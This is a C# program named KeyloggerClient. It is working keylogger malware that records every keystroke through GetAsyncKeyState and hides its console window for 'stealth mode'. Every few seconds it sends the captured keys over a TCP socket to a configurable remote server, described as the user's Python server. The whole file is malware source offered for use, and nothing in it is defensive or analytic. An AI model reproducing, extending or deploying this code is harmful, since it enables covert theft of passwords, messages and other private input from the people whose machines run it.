using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;

namespace KeyloggerClient
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        // Socket connection details
        private static string serverIP = "192.168.1.100"; // Change to your Python server's IP
        private static int serverPort = 5555;

        // Interval to send logs (in milliseconds)
        private static int sendInterval = 5000; // Every 5 seconds

        // Store keystrokes
        private static StringBuilder keyBuffer = new StringBuilder();

        static void Main(string[] args)
        {
            // Run the keylogger in a separate thread to prevent UI blocking
            Thread keylogThread = new Thread(new ThreadStart(StartKeylogger));
            keylogThread.Start();

            // Hide the console window to run in stealth mode
            HideConsoleWindow();
        }

        static void StartKeylogger()
        {
            try
            {
                while (true)
                {
                    // Log keystrokes
                    for (int i = 0; i < 255; i++)
                    {
                        int state = GetAsyncKeyState(i);

                        if (state == 1 || state == -32767)
                        {
                            if ((Keys)i == Keys.Enter)
                            {
                                keyBuffer.Append("[ENTER]");
                            }
                            else if ((Keys)i == Keys.Space)
                            {
                                keyBuffer.Append("[SPACE]");
                            }
                            else if ((Keys)i == Keys.Back)
                            {
                                keyBuffer.Append("[BACKSPACE]");
                            }
                            else
                            {
                                keyBuffer.Append((Keys)i);
                            }
                        }
                    }

                    // Send the key buffer to the server at intervals
                    if (keyBuffer.Length > 0)
                    {
                        SendLogsToServer();
                    }

                    // Wait for the specified interval before sending logs again
                    Thread.Sleep(sendInterval);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        static void SendLogsToServer()
        {
            try
            {
                // Connect to the Python server
                using (TcpClient client = new TcpClient(serverIP, serverPort))
                {
                    NetworkStream stream = client.GetStream();

                    // Convert the key buffer to bytes
                    byte[] data = Encoding.ASCII.GetBytes(keyBuffer.ToString());

                    // Send the data
                    stream.Write(data, 0, data.Length);

                    // Receive confirmation from the server
                    byte[] responseData = new byte[256];
                    int bytes = stream.Read(responseData, 0, responseData.Length);
                    string response = Encoding.ASCII.GetString(responseData, 0, bytes);

                    if (response == "ok")
                    {
                        // Clear the key buffer after successful transmission
                        keyBuffer.Clear();
                    }
                }
            }
            catch (SocketException ex)
            {
                Console.WriteLine("Socket Error: " + ex.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        // Hide the console window for stealth mode
        static void HideConsoleWindow()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
    }
}